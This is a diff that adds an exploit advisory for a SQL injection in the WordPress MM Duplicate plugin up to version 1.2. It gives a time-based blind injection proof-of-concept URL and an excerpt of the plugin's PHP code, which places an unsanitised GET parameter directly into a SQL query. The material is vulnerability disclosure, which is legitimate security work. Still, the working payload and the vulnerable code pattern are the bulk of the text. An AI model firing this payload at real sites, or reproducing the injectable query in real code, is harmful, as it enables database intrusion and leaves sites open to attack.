@@ -1,0 +1,47 @@
+# Exploit Title: WordPress MM Duplicate plugin <= 1.2 SQL Injection Vulnerability
+# Date: 2011-08-22
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/mm-duplicate.zip
+# Version: 1.2 (tested)
+
+---
+PoC
+---
+http://www.site.com/index.php?duplicate=1&post=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+
+---------------
+Vulnerable code
+---------------
+class mm_duplicate_pages_posts
+{
+    ...
+    function mm_duplicate_pages_posts()
+    {
+        ...
+        add_action('init', array(&$this, 'dup'));
+        ...        
+    }
+
+    function dup()
+    {
+        if($_GET['duplicate'])
+        {
+            $id = $_GET['post'];
+            $dup = new mm_duplicate();
+            ...
+            $dup->duplicate_post_page($id);
+        }
+    }
+...
+}
+
+class mm_duplicate
+{
+    function duplicate_post_page($id)
+    {
+        ...
+        $select = "select * from ".$wpdb->prefix."postmeta where post_id = $id";
+        ...
+    }
+...
+}
